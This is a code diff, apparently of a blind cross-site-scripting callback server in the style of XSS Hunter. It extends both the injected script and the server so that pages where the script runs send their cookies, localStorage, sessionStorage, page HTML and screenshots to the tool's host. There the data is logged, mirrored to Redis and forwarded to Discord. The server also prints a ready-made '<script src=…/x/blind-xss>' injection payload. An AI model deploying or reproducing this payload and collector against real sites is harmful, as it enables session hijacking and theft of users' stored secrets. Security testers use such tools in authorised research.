@@ -3,13 +3,14 @@ import crypto from "node:crypto";
 import fs from "node:fs";
 import path from "node:path";
 import { fileURLToPath } from "node:url";
+import multer from "multer";
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
 const app = express();
 const PORT = process.env.PORT || 10000;
-const publicBaseUrl = (process.env.PUBLIC_BASE_URL || `http://localhost:${PORT}`).replace(/\/$/, "");
+const publicBaseUrl = (process.env.PUBLIC_BASE_URL || process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`).replace(/\/$/, "");
 const dataDir = process.env.DATA_DIR || __dirname;
 fs.mkdirSync(dataDir, { recursive: true });
 const logFile = path.join(dataDir, "callbacks.jsonl");
@@ -17,32 +18,54 @@ const dashboardUsername = process.env.DASHBOARD_USERNAME;
 const dashboardPassword = process.env.DASHBOARD_PASSWORD;
 const sessionSecret = process.env.SESSION_SECRET || dashboardPassword;
 const discordWebhookUrl = process.env.DISCORD_WEBHOOK_URL || "";
+const redisUrl = (process.env.UPSTASH_REDIS_REST_URL || "").replace(/\/+$/, "");
+const redisToken = process.env.UPSTASH_REDIS_REST_TOKEN || "";
+const redisKey = process.env.UPSTASH_REDIS_KEY || "xsstrace:callbacks";
+const redisEnabled = Boolean(redisUrl && redisToken);
 const failedLogins = new Map();
 
 app.disable("x-powered-by");
 app.set("trust proxy", true);
 
-app.use(express.json({ limit: "5mb", type: ["application/json", "application/*+json", "text/plain"] }));
+app.use(express.json({ limit: "10mb", type: ["application/json", "application/*+json", "text/plain"] }));
 app.use(express.urlencoded({ extended: false, limit: "16kb" }));
 
 app.get("/", (_req, res) => {
   res.sendFile(path.join(__dirname, "index.html"));
 });
 
+app.get("/favicon.ico", (_req, res) => {
+  res.sendFile(path.join(__dirname, "favicon.png"));
+});
+
+// Self-test page: loads a real payload in a browser so execution hits
+// (cookies, DOM text, blurred screenshot) are actually generated.
+app.get("/test", (req, res) => {
+  const marker = String(req.query.marker || "test-page").replace(/[^a-zA-Z0-9._-]/g, "").slice(0, 64) || "test-page";
+  res.set({
+    "Cache-Control": "no-store, max-age=0",
+    "X-Content-Type-Options": "nosniff"
+  });
+  res.type("html").send(buildTestPage(publicBaseUrl, marker));
+});
+
 app.get("/login", (req, res) => {
   setPrivatePageHeaders(res);
+  const next = sanitizeLoginNext(req.query.next);
   if (isAuthenticated(req)) {
-    res.redirect("/dashboard");
+    res.redirect(next);
     return;
   }
 
-  res.type("html").send(buildLoginPage(Boolean(req.query.error)));
+  res.type("html").send(buildLoginPage(Boolean(req.query.error), undefined, next));
 });
 
 app.post("/login", (req, res) => {
   setPrivatePageHeaders(res);
+  const next = sanitizeLoginNext(req.body.next);
+
   if (!dashboardUsername || !dashboardPassword || !sessionSecret) {
-    res.status(500).type("html").send(buildLoginPage(true, "Dashboard credentials are not configured on the server."));
+    res.status(500).type("html").send(buildLoginPage(true, "Dashboard credentials are not configured on the server.", next));
     return;
   }
 
@@ -51,7 +74,7 @@ app.post("/login", (req, res) => {
   const now = Date.now();
 
   if (attempts.resetAt > now && attempts.count >= 8) {
-    res.status(429).type("html").send(buildLoginPage(true, "Too many attempts. Try again shortly."));
+    res.status(429).type("html").send(buildLoginPage(true, "Too many attempts. Try again shortly.", next));
     return;
   }
 
@@ -61,13 +84,13 @@ app.post("/login", (req, res) => {
       count: attempts.resetAt > now ? attempts.count + 1 : 1,
       resetAt: now + 10 * 60 * 1000
     });
-    res.redirect("/login?error=1");
+    res.redirect("/login?error=1&next=" + encodeURIComponent(next));
     return;
   }
 
   failedLogins.delete(ip);
   setAuthCookie(res);
-  res.redirect("/dashboard");
+  res.redirect(next);
 });
 
 app.post("/logout", (_req, res) => {
@@ -88,6 +111,7 @@ app.get("/api/callbacks", requireAuth, (_req, res) => {
 
 app.post("/api/callbacks/clear", requireAuth, (_req, res) => {
   fs.writeFileSync(logFile, "", "utf8");
+  void redisClear();
   res.json({ ok: true, callbacks: [] });
 });
 
@@ -111,6 +135,7 @@ app.post("/api/callbacks/import", requireAuth, (req, res) => {
 
   if (normalized.length) {
     fs.appendFileSync(logFile, normalized.map((entry) => JSON.stringify(entry)).join("\n") + "\n", "utf8");
+    void redisAppendMany(normalized);
   }
 
   res.json({ ok: true, imported: normalized.length, callbacks: readCallbacks(null).reverse() });
@@ -120,7 +145,8 @@ app.post("/api/callbacks/delete-page", requireAuth, (req, res) => {
   const pageKey = String(req.body.pageKey || "");
   const remaining = readCallbacks(null).filter((entry) => pageKeyForEntry(entry) !== pageKey);
   fs.writeFileSync(logFile, remaining.map((entry) => JSON.stringify(entry)).join("\n") + (remaining.length ? "\n" : ""), "utf8");
-  res.json({ ok: true, callbacks: remaining.reverse() });
+  void redisReplace(remaining);
+  res.json({ ok: true, callbacks: remaining.slice().reverse() });
 });
 
 app.post("/api/callbacks/move-page", requireAuth, (req, res) => {
@@ -145,7 +171,8 @@ app.post("/api/callbacks/move-page", requireAuth, (req, res) => {
   });
 
   fs.writeFileSync(logFile, updated.map((entry) => JSON.stringify(entry)).join("\n") + (updated.length ? "\n" : ""), "utf8");
-  res.json({ ok: true, callbacks: updated.reverse() });
+  void redisReplace(updated);
+  res.json({ ok: true, callbacks: updated.slice().reverse() });
 });
 
 app.get("/health", (_req, res) => {
@@ -170,10 +197,116 @@ app.post("/callback", (req, res) => {
     userAgent: cleanString(body.userAgent),
     language: cleanString(body.language),
     viewport: cleanString(body.viewport),
+    title: cleanString(body.title),
+    origin: cleanString(body.origin),
+    windowName: cleanString(body.windowName),
+    cookies: cleanString(body.cookies),
+    localStorage: cleanLong(body.localStorage),
+    sessionStorage: cleanLong(body.sessionStorage),
+    domSnapshot: cleanImage(body.domSnapshot),
     source: "script"
   });
 
   res.status(204).end();
+});
+
+// Multer: parse multipart/form-data from bugatsec.js payload
+// screenshot goes to memory (capped at 5 MB); all other fields go to req.body
+const upload = multer({
+  storage: multer.memoryStorage(),
+  limits: {
+    fileSize: 10 * 1024 * 1024,   // 10 MB — screenshots can be large
+    fieldSize: 2 * 1024 * 1024    // 2 MB — collected page HTML arrives as a text field
+  }
+});
+
+// /js_callback — receives POSTs from bugatsec.js (XSS Hunter Express payload format)
+// Field map:
+//   uri           → pageUrl
+//   referrer      → referrer
+//   user-agent    → userAgent
+//   browser-time  → (stored in windowName slot; no dedicated field in schema)
+//   probe-uid     → marker
+//   origin        → origin
+//   injection_key → (ignored — always "bugatsec")
+//   title         → title
+//   cookies       → cookies
+//   screenshot    → (file, stored as base64 in domSnapshot)
+//   text          → (page text, stored in sessionStorage slot)
+//   was_iframe    → (ignored)
+//   secrets       → (stored in localStorage slot)
+//   CORS          → (appended to windowName)
+//   gitExposed    → (appended to windowName)
+app.post("/js_callback", upload.single("screenshot"), (req, res) => {
+  const b = req.body || {};
+
+  // injection_key = user-named marker (e.g. "blind-xss") — this is what to show
+  // probe-uid     = random UUID from get_guid() — keep for reference only
+  const extras = [];
+  const probeUid = b["probe-uid"] || "";
+  if (probeUid) extras.push("probe-uid:" + probeUid);
+  if (b["browser-time"]) extras.push("time:" + b["browser-time"]);
+  if (b["CORS"] && b["CORS"] !== "false") extras.push("CORS:" + b["CORS"]);
+  if (b["gitExposed"] && b["gitExposed"] !== "false") extras.push("git:" + b["gitExposed"]);
+
+  // Screenshot: file buffer → base64 data URI (preserve the uploaded MIME type)
+  let screenshotField = "";
+  if (req.file && req.file.buffer && req.file.buffer.length) {
+    const mime = /^image\//.test(req.file.mimetype || "") ? req.file.mimetype : "image/png";
+    screenshotField = `data:${mime};base64,` + req.file.buffer.toString("base64");
+  }
+
+  writeCallback({
+    ip: req.ip,
+    marker: cleanString(b["injection_key"] || probeUid || "bugatsec"),
+    pageUrl: cleanString(b["uri"] || ""),
+    referrer: cleanString(b["referrer"] || ""),
+    userAgent: cleanString(b["user-agent"] || ""),
+    language: "",
+    viewport: "",
+    title: cleanString(b["title"] || ""),
+    origin: cleanString(b["origin"] || ""),
+    windowName: cleanString(extras.join(" | ")),
+    cookies: cleanLong(b["cookies"] || ""),
+    localStorage: cleanLong(b["secrets"] || ""),
+    sessionStorage: cleanLong(b["text"] || ""),
+    domSnapshot: cleanImage(screenshotField),
+    source: "bugatsec-payload"
+  });
+
+  res.status(200).send("OK");
+});
+
+// /js_page_callback — receives page-source collection POSTs from bugatsec.js
+// (send_collected_page). The default template ships with collect_page_list empty,
+// so this only fires when that list is populated, but the endpoint must exist or
+// those requests 404.
+// Field map:
+//   uri  → pageUrl (the page that was fetched)
+//   html → fetched page source (stored as domSnapshot)
+//   path → marker hint (payload always appends "bugatsec")
+app.post("/js_page_callback", upload.none(), (req, res) => {
+  const b = req.body || {};
+
+  writeCallback({
+    ip: req.ip,
+    marker: cleanString(b["injection_key"] || b["path"] || "page-collect"),
+    pageUrl: cleanString(b["uri"] || ""),
+    referrer: cleanString(req.get("referer") || ""),
+    userAgent: cleanString(req.get("user-agent") || ""),
+    language: "",
+    viewport: "",
+    title: cleanString(b["title"] || ""),
+    origin: cleanString(b["origin"] || ""),
+    windowName: cleanString(b["injection_key"] ? "injection_key:" + b["injection_key"] : ""),
+    cookies: cleanString(b["cookies"] || ""),
+    localStorage: "",
+    sessionStorage: "",
+    domSnapshot: cleanHtml(b["html"] || ""),
+    source: "bugatsec-page"
+  });
+
+  res.status(200).send("OK");
 });
 
 app.get("/i/:marker.gif", (req, res) => {
@@ -195,15 +328,57 @@ app.get("/i/:marker.gif", (req, res) => {
   res.send(Buffer.from("R0lGODlhAQABAPAAAP///wAAACH5BAAAAAAALAAAAAABAAEAAAICRAEAOw==", "base64"));
 });
 
+// Cache the patched bugatsec.js template at startup (sync, once)
+const bugatsecTemplatePath = path.join(__dirname, "bugatsec.js");
+let bugatsecTemplate = null;
+if (fs.existsSync(bugatsecTemplatePath)) {
+  bugatsecTemplate = fs.readFileSync(bugatsecTemplatePath, "utf8");
+}
+
 app.get("/x/*", (req, res) => {
+  const marker = markerFromPath(req.params[0]);
+
+  // Collect every useful HTTP header available at script-fetch time
+  // These are the ONLY things we can get before JS executes
+  const referer    = cleanString(req.get("referer") || "");
+  const ua         = cleanString(req.get("user-agent") || "");
+  const lang       = cleanString(req.get("accept-language") || "");
+  const xfwd       = cleanString(req.get("x-forwarded-for") || "");
+  const cfIp       = cleanString(req.get("cf-connecting-ip") || "");  // Cloudflare real IP
+  const secUa      = cleanString(req.get("sec-ch-ua") || "");          // e.g. "Chromium";v="124"
+  const secUaPlatform = cleanString(req.get("sec-ch-ua-platform") || ""); // "Windows"
+  const secUaMobile   = cleanString(req.get("sec-ch-ua-mobile") || "");   // ?0 or ?1
+  const secFetchSite  = cleanString(req.get("sec-fetch-site") || "");  // cross-site / same-origin
+  const secFetchDest  = cleanString(req.get("sec-fetch-dest") || "");  // script
+
+  // Resolve best real IP: CF > X-Forwarded-For first entry > req.ip
+  const realIp = cfIp || (xfwd ? xfwd.split(",")[0].trim() : "") || req.ip;
+
+  // Pack extra header info into sessionStorage slot (repurposed for hit-1 header dump)
+  const headerDump = [
+    secUa         && `sec-ch-ua: ${secUa}`,
+    secUaPlatform && `sec-ch-ua-platform: ${secUaPlatform}`,
+    secUaMobile   && `sec-ch-ua-mobile: ${secUaMobile}`,
+    secFetchSite  && `sec-fetch-site: ${secFetchSite}`,
+    secFetchDest  && `sec-fetch-dest: ${secFetchDest}`,
+    xfwd          && `x-forwarded-for: ${xfwd}`,
+  ].filter(Boolean).join("\n");
+
   writeCallback({
-    ip: req.ip,
-    marker: markerFromPath(req.params[0]),
-    pageUrl: "",
-    referrer: cleanString(req.get("referer") || ""),
-    userAgent: cleanString(req.get("user-agent") || ""),
-    language: cleanString(req.get("accept-language") || ""),
+    ip: realIp,
+    marker,
+    pageUrl: referer,   // Referer IS the page URL that contained the script tag
+    referrer: "",
+    userAgent: ua,
+    language: lang,
     viewport: "",
+    title: "",
+    origin: "",
+    windowName: "",
+    cookies: "",
+    localStorage: "",
+    sessionStorage: headerDump,  // extra headers packed here for display
+    domSnapshot: "",
     source: "payload-load"
   });
 
@@ -213,7 +388,21 @@ app.get("/x/*", (req, res) => {
     "X-Content-Type-Options": "nosniff"
   });
 
-  res.send(buildPayload(publicBaseUrl, req.params[0]));
+  if (bugatsecTemplate) {
+    // Inject real server URLs and the named marker into the script at request time
+    // Replace the injection_key assignment line specifically to preserve the marker name
+    const patched = bugatsecTemplate
+      .replace("XSSHUNTER_CALLBACK_URL", `${publicBaseUrl}/js_callback`)
+      .replace("XSSHUNTER_PAGE_CALLBACK_URL", `${publicBaseUrl}/js_page_callback`)
+      .replace(
+        /probe_return_data\['injection_key'\]\s*=\s*"bugatsec";/,
+        `probe_return_data['injection_key'] = ${JSON.stringify(marker)};`
+      );
+    res.send(patched);
+  } else {
+    // Fallback to built-in minimal payload if bugatsec.js is missing
+    res.send(buildPayload(publicBaseUrl, req.params[0]));
+  }
 });
 
 app.post("/x/*", captureRawBody, (req, res) => {
@@ -225,21 +414,67 @@ app.post("/x/*", captureRawBody, (req, res) => {
     userAgent: cleanString(req.get("user-agent") || ""),
     language: cleanString(req.get("accept-language") || ""),
     viewport: "",
-    rawBody: cleanString(req.rawBody || ""),
+    rawBody: cleanBody(req.rawBody || ""),
     source: "payload-post"
   });
 
   res.status(204).end();
 });
 
+// Authenticated debug endpoint. Keep it behind the dashboard login so captured
+// cookies, local storage, and other hit data are never exposed publicly.
+app.get("/debug/status", requireAuth, (_req, res) => {
+  const exists = fs.existsSync(logFile);
+  let lines = [];
+  let parseErrors = 0;
+  if (exists) {
+    const raw = fs.readFileSync(logFile, "utf8");
+    const rawLines = raw.split(/\r?\n/).filter(Boolean);
+    lines = rawLines.map((line) => {
+      try {
+        const e = JSON.parse(line);
+        // Strip domSnapshot from debug output (too large)
+        return { ...e, domSnapshot: e.domSnapshot ? `[${e.domSnapshot.length} chars]` : "" };
+      } catch {
+        parseErrors++;
+        return { parseError: line.slice(0, 100) };
+      }
+    });
+  }
+  res.json({
+    logFile,
+    exists,
+    lineCount: lines.length,
+    parseErrors,
+    last5: lines.slice(-5),
+    env: {
+      PUBLIC_BASE_URL: process.env.PUBLIC_BASE_URL || "(not set)",
+      DASHBOARD_USERNAME: process.env.DASHBOARD_USERNAME ? "(set)" : "(not set)",
+      DASHBOARD_PASSWORD: process.env.DASHBOARD_PASSWORD ? "(set)" : "(not set)",
+      DISCORD_WEBHOOK_URL: process.env.DISCORD_WEBHOOK_URL ? "(set)" : "(not set)",
+      UPSTASH_REDIS_REST_URL: process.env.UPSTASH_REDIS_REST_URL ? "(set)" : "(not set)",
+      UPSTASH_REDIS_REST_TOKEN: process.env.UPSTASH_REDIS_REST_TOKEN ? "(set)" : "(not set)",
+      DATA_DIR: process.env.DATA_DIR || "(not set, using __dirname)"
+    }
+  });
+});
+
 app.use((_req, res) => {
   res.status(404).type("text").send("Not found");
 });
 
-app.listen(PORT, () => {
-  console.log(`Blind XSS server listening on http://localhost:${PORT}`);
-  console.log(`Example payload: <script src="${publicBaseUrl}/x/blind-xss"></script>`);
-});
+async function start() {
+  await restoreFromRedis();
+  app.listen(PORT, () => {
+    console.log(`Blind XSS server listening on http://localhost:${PORT}`);
+    console.log(`Example payload: <script src="${publicBaseUrl}/x/blind-xss"></script>`);
+    console.log(redisEnabled
+      ? "Persistence: Upstash Redis mirror enabled"
+      : "Persistence: local file only (add UPSTASH_REDIS_REST_URL/TOKEN to survive restarts)");
+  });
+}
+
+start();
 
 function captureRawBody(req, res, next) {
   // If express.json()/express.urlencoded() already parsed a matching
@@ -284,6 +519,46 @@ function cleanString(value) {
   return value.slice(0, 2000);
 }
 
+// For larger fields: cookies, storage, DOM text
+function cleanLong(value) {
+  if (typeof value !== "string") {
+    return "";
+  }
+
+  return value.slice(0, 10000);
+}
+
+// For screenshots / base64 images. multer caps uploads at 10 MB, which inflates
+// to ~13.98M base64 chars. Keep the ceiling above that so a full screenshot is
+// stored intact — cutting base64 short leaves the dashboard <img> with an
+// invalid data URI and a broken image.
+function cleanImage(value) {
+  if (typeof value !== "string") {
+    return "";
+  }
+
+  const MAX_IMAGE_CHARS = 14_000_000;
+  return value.length > MAX_IMAGE_CHARS ? "" : value;
+}
+
+// For raw request bodies captured on /x/* (captureRawBody caps at ~1 MB)
+function cleanBody(value) {
+  if (typeof value !== "string") {
+    return "";
+  }
+
+  return value.slice(0, 1_000_000);
+}
+
+// For collected page source (bugatsec.js /js_page_callback)
+function cleanHtml(value) {
+  if (typeof value !== "string") {
+    return "";
+  }
+
+  return value.slice(0, 200_000);
+}
+
 function requireAuth(req, res, next) {
   setPrivatePageHeaders(res);
   if (isAuthenticated(req)) {
@@ -296,7 +571,31 @@ function requireAuth(req, res, next) {
     return;
   }
 
-  res.redirect("/login");
+  // Preserve the client-side #hash (e.g. #hit=... from a Discord link) by
+  // letting the browser forward it into the login `next` parameter.
+  res.status(401).type("html").send(buildLoginRedirectPage());
+}
+
+function sanitizeLoginNext(value) {
+  const next = String(value || "");
+  return /^\/dashboard(#[^\s]*)?$/.test(next) ? next : "/dashboard";
+}
+
+function buildLoginRedirectPage() {
+  return `<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Login required</title>
+</head>
+<body>
+  <script>
+    location.replace("/login?next=" + encodeURIComponent("/dashboard" + location.hash));
+  </script>
+  <noscript><meta http-equiv="refresh" content="0;url=/login"></noscript>
+</body>
+</html>`;
 }
 
 function setPrivatePageHeaders(res) {
@@ -419,20 +718,39 @@ function writeCallback(entry) {
     userAgent: entry.userAgent || "",
     language: entry.language || "",
     viewport: entry.viewport || "",
+    title: entry.title || "",
+    origin: entry.origin || "",
+    windowName: entry.windowName || "",
+    cookies: entry.cookies || "",
+    localStorage: entry.localStorage || "",
+    sessionStorage: entry.sessionStorage || "",
+    domSnapshot: entry.domSnapshot || "",
     rawBody: entry.rawBody || "",
     source: entry.source || "unknown"
   };
 
   fs.appendFileSync(logFile, `${JSON.stringify(normalized)}\n`, "utf8");
   console.log("Blind XSS callback:", normalized);
+  void redisAppend(normalized);
   notifyDiscord(normalized);
 }
 
 // Discord embed field values are capped at 1024 chars each.
 const DISCORD_FIELD_LIMIT = 1024;
 
+// User agents to silently ignore — no Discord alert will be sent for these.
+const IGNORED_USER_AGENTS = [
+  "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
+];
+
 function notifyDiscord(entry) {
   if (!discordWebhookUrl) {
+    return;
+  }
+
+  // Skip Discord notification if the hit came from an ignored crawler/bot UA.
+  const ua = (entry.userAgent || "").trim();
+  if (IGNORED_USER_AGENTS.some((ignored) => ua.toLowerCase() === ignored.toLowerCase())) {
     return;
   }
 
@@ -448,17 +766,36 @@ function notifyDiscord(entry) {
   ];
 
   const rawBody = String(entry.rawBody || "");
+  const cookies = String(entry.cookies || "");
+  const localStorage = String(entry.localStorage || "");
+  const sessionStorage = String(entry.sessionStorage || "");
+  const title = String(entry.title || "");
+  const windowName = String(entry.windowName || "");
+
+  // Wrap data fields in code blocks so they're distinguishable in Discord
+  function codeBlock(v) { return "```\n" + v.slice(0, 990) + "\n```"; }
+
+  const extraFields = [];
+  if (title) extraFields.push({ name: "📄 Page Title", value: truncateDiscord(title), inline: true });
+  if (windowName) extraFields.push({ name: "🪟 window.name", value: codeBlock(windowName), inline: false });
+  if (cookies) extraFields.push({ name: "🍪 Cookies", value: codeBlock(cookies), inline: false });
+  if (localStorage) extraFields.push({ name: "💾 localStorage", value: codeBlock(localStorage), inline: false });
+  const sessionStorageLabel = entry.source === "payload-load" ? "📋 Request Headers" : "💾 sessionStorage";
+  if (sessionStorage) extraFields.push({ name: sessionStorageLabel, value: codeBlock(sessionStorage), inline: false });
+
+  const screenshot = parseScreenshotDataUrl(entry.domSnapshot);
 
   if (!rawBody) {
-    sendDiscordEmbed([...baseFields, dashboardField], entry.receivedAt, "New Blind XSS Hit");
+    sendDiscordEmbed([...baseFields, ...extraFields, dashboardField], entry.receivedAt, "New Blind XSS Hit", screenshot);
     return;
   }
 
   if (rawBody.length <= DISCORD_FIELD_LIMIT) {
     sendDiscordEmbed(
-      [...baseFields, { name: "Body", value: rawBody, inline: false }, dashboardField],
+      [...baseFields, ...extraFields, { name: "Body", value: rawBody, inline: false }, dashboardField],
       entry.receivedAt,
-      "New Blind XSS Hit"
+      "New Blind XSS Hit",
+      screenshot
     );
     return;
   }
@@ -469,9 +806,10 @@ function notifyDiscord(entry) {
   const secondHalf = rawBody.slice(DISCORD_FIELD_LIMIT, DISCORD_FIELD_LIMIT * 2);
 
   sendDiscordEmbed(
-    [...baseFields, { name: "Body (1/2)", value: firstHalf, inline: false }],
+    [...baseFields, ...extraFields, { name: "Body (1/2)", value: firstHalf, inline: false }],
     entry.receivedAt,
-    "New Blind XSS Hit"
+    "New Blind XSS Hit",
+    screenshot
   );
 
   sendDiscordEmbed(
@@ -485,19 +823,67 @@ function notifyDiscord(entry) {
   );
 }
 
-function sendDiscordEmbed(fields, timestamp, title) {
+// Parse a data:image/... URL into a webhook attachment. Returns null when the
+// hit has no image (payload-load hits), the data is too large, or decoding fails.
+function parseScreenshotDataUrl(value) {
+  const match = /^data:(image\/[a-z0-9.+-]+);base64,(.*)$/i.exec(String(value || ""));
+  if (!match || match[2].length > 6_500_000) {
+    return null;
+  }
+
+  const mime = match[1].toLowerCase();
+  const buffer = Buffer.from(match[2], "base64");
+  if (!buffer.length) {
+    return null;
+  }
+
+  const ext = mime === "image/jpeg" ? "jpg"
+    : mime === "image/webp" ? "webp"
+    : mime === "image/gif" ? "gif"
+    : "png";
+
+  return { buffer, mime, filename: `xsstrace-hit.${ext}` };
+}
+
+function sendDiscordEmbed(fields, timestamp, title, screenshot = null) {
+  const embed = {
+    title,
+    color: 2140567,
+    timestamp,
+    fields
+  };
+
+  if (screenshot) {
+    embed.image = { url: `attachment://${screenshot.filename}` };
+  }
+
+  const payload = {
+    username: "Blind XSS Monitor",
+    embeds: [embed]
+  };
+
+  if (!screenshot) {
+    fetch(discordWebhookUrl, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    }).catch((error) => {
+      console.error("Discord notification failed:", error.message);
+    });
+    return;
+  }
+
+  const form = new FormData();
+  form.append("payload_json", JSON.stringify(payload));
+  form.append(
+    "files[0]",
+    new Blob([screenshot.buffer], { type: screenshot.mime }),
+    screenshot.filename
+  );
+
   fetch(discordWebhookUrl, {
     method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      username: "Blind XSS Monitor",
-      embeds: [{
-        title,
-        color: 2140567,
-        timestamp,
-        fields
-      }]
-    })
+    body: form
   }).catch((error) => {
     console.error("Discord notification failed:", error.message);
   });
@@ -523,9 +909,75 @@ function normalizeImportedEntry(entry) {
     userAgent: cleanString(entry.userAgent),
     language: cleanString(entry.language),
     viewport: cleanString(entry.viewport),
-    rawBody: cleanString(entry.rawBody),
+    title: cleanString(entry.title),
+    origin: cleanString(entry.origin),
+    windowName: cleanString(entry.windowName),
+    cookies: cleanLong(entry.cookies),
+    localStorage: cleanLong(entry.localStorage),
+    sessionStorage: cleanLong(entry.sessionStorage),
+    domSnapshot: cleanImage(entry.domSnapshot),
+    rawBody: cleanBody(entry.rawBody),
     source: cleanString(entry.source) || "import"
   };
+}
+
+function buildTestPage(baseUrl, marker) {
+  const payloadUrl = `${baseUrl}/x/${encodeURIComponent(marker)}`;
+
+  return `<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>XSSTrace Test Page</title>
+  <style>
+    :root { color-scheme: dark; }
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      min-height: 100vh;
+      display: grid;
+      place-items: center;
+      padding: 24px;
+      background: #101214;
+      color: #edf2f7;
+      font: 15px/1.6 system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    }
+    main {
+      width: min(720px, 100%);
+      background: #171b1f;
+      border: 1px solid #303941;
+      border-radius: 8px;
+      padding: 28px;
+    }
+    h1 { margin: 0 0 12px; font-size: 24px; }
+    p { color: #9aa7b2; }
+    code { background: #0b0d0f; border: 1px solid #303941; border-radius: 4px; padding: 1px 5px; color: #20c997; }
+    #status { color: #f7b955; }
+  </style>
+</head>
+<body>
+  <main>
+    <h1>XSSTrace Test Page</h1>
+    <p>This page executes a real payload with marker <code>${escapeHtml(marker)}</code>.</p>
+    <p>It sets a cookie, localStorage and sessionStorage, then loads the payload so the dashboard receives an <strong>execution hit</strong> with cookies and a screenshot.</p>
+    <p id="status">Running payload…</p>
+    <p><a href="${escapeHtml(baseUrl)}/dashboard" style="color:#20c997">Open dashboard</a></p>
+  </main>
+  <script>
+    document.cookie = "xsstest_cookie=hello-from-test-page; path=/";
+    localStorage.setItem("xsstest_local", "local-storage-value");
+    sessionStorage.setItem("xsstest_session", "session-storage-value");
+  </script>
+  <script src="${escapeHtml(payloadUrl)}"></script>
+  <script>
+    setTimeout(function () {
+      document.getElementById("status").textContent =
+        "Payload loaded. The dashboard should show the hit within a few seconds (source: bugatsec-payload).";
+    }, 2000);
+  </script>
+</body>
+</html>`;
 }
 
 function buildPayload(baseUrl, markerPath) {
@@ -536,13 +988,56 @@ function buildPayload(baseUrl, markerPath) {
   return `(() => {
   "use strict";
 
+  function safeGet(fn) {
+    try { return fn(); } catch (_) { return ""; }
+  }
+
+  function truncate(s, n) {
+    return String(s || "").slice(0, n);
+  }
+
+  // Collect cookies
+  const cookies = safeGet(() => document.cookie) || "";
+
+  // Collect localStorage (keys + values, truncated to 4000 chars total)
+  let localStorageData = "";
+  try {
+    const ls = {};
+    for (let i = 0; i < localStorage.length; i++) {
+      const k = localStorage.key(i);
+      ls[k] = localStorage.getItem(k);
+    }
+    localStorageData = truncate(JSON.stringify(ls), 4000);
+  } catch (_) {}
+
+  // Collect sessionStorage
+  let sessionStorageData = "";
+  try {
+    const ss = {};
+    for (let i = 0; i < sessionStorage.length; i++) {
+      const k = sessionStorage.key(i);
+      ss[k] = sessionStorage.getItem(k);
+    }
+    sessionStorageData = truncate(JSON.stringify(ss), 4000);
+  } catch (_) {}
+
+  // DOM snapshot - outer HTML truncated to 8000 chars
+  const domSnapshot = safeGet(() => truncate(document.documentElement.outerHTML, 8000));
+
   const payload = {
     marker: ${marker},
     pageUrl: String(location.href),
     referrer: String(document.referrer || ""),
     userAgent: String(navigator.userAgent || ""),
     language: String(navigator.language || ""),
-    viewport: String(window.innerWidth || "") + "x" + String(window.innerHeight || "")
+    viewport: String(window.innerWidth || "") + "x" + String(window.innerHeight || ""),
+    title: safeGet(() => document.title),
+    origin: safeGet(() => location.origin),
+    windowName: safeGet(() => window.name),
+    cookies: truncate(cookies, 2000),
+    localStorage: localStorageData,
+    sessionStorage: sessionStorageData,
+    domSnapshot
   };
 
   const body = JSON.stringify(payload);
@@ -603,7 +1098,203 @@ function readCallbacks(limit = 500) {
   return limit === null ? callbacks : callbacks.slice(-limit);
 }
 
-function buildLoginPage(hasError = false, message = "Invalid password.") {
+// ---------------------------------------------------------------------------
+// Optional free-tier persistence: mirror the JSONL log to Upstash Redis (REST).
+// Render free instances have an ephemeral filesystem, so without this the log
+// is wiped on every redeploy/spin-down. Set UPSTASH_REDIS_REST_URL and
+// UPSTASH_REDIS_REST_TOKEN to enable. The local file stays the read source.
+// ---------------------------------------------------------------------------
+
+// Send a single command as a JSON array in the POST body. Upstash appends a
+// plain POST body as one argument, so passing an array is the only way to
+// guarantee the stored list element is the raw JSON line (not `["{...}"]`).
+async function redisRequest(command) {
+  const response = await fetch(redisUrl, {
+    method: "POST",
+    headers: {
+      "Authorization": `Bearer ${redisToken}`,
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify(command)
+  });
+
+  if (!response.ok) {
+    throw new Error(`HTTP ${response.status}`);
+  }
+
+  const data = await response.json();
+  if (data && data.error) {
+    throw new Error(data.error);
+  }
+
+  return data ? data.result : null;
+}
+
+async function redisPipeline(commands) {
+  const response = await fetch(`${redisUrl}/pipeline`, {
+    method: "POST",
+    headers: {
+      "Authorization": `Bearer ${redisToken}`,
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify(commands)
+  });
+
+  if (!response.ok) {
+    throw new Error(`HTTP ${response.status}`);
+  }
+
+  const data = await response.json();
+  if (!Array.isArray(data)) {
+    throw new Error(data && data.error ? data.error : "unexpected pipeline response");
+  }
+
+  const failed = data.find((item) => item && item.error);
+  if (failed) {
+    throw new Error(failed.error);
+  }
+
+  return data;
+}
+
+// Older builds posted `[json]` as a plain body, which Upstash stored as the
+// literal string `["{...}"]`. Unwrap those (and old multi-entry chunks) so the
+// restored JSONL file stays parseable after the write-format fix.
+function normalizeStoredItem(item) {
+  if (typeof item !== "string") {
+    return [JSON.stringify(item)];
+  }
+
+  const trimmed = item.trim();
+  if (trimmed.startsWith("[")) {
+    try {
+      const parsed = JSON.parse(trimmed);
+      if (Array.isArray(parsed)) {
+        return parsed.flatMap((inner) =>
+          normalizeStoredItem(typeof inner === "string" ? inner : JSON.stringify(inner))
+        );
+      }
+    } catch {
+      // Not a JSON array; keep the raw value.
+    }
+  }
+
+  return [item];
+}
+
+async function restoreFromRedis() {
+  if (!redisEnabled) {
+    return;
+  }
+
+  // Keep any local log that already survived (e.g. when a real disk is mounted).
+  if (fs.existsSync(logFile) && fs.statSync(logFile).size > 0) {
+    return;
+  }
+
+  try {
+    // Page the read so a large log never trips the 10MB request/response cap.
+    const items = [];
+    const PAGE = 10;
+    let start = 0;
+    while (true) {
+      const page = await redisRequest(["LRANGE", redisKey, String(start), String(start + PAGE - 1)]);
+      if (!Array.isArray(page) || !page.length) {
+        break;
+      }
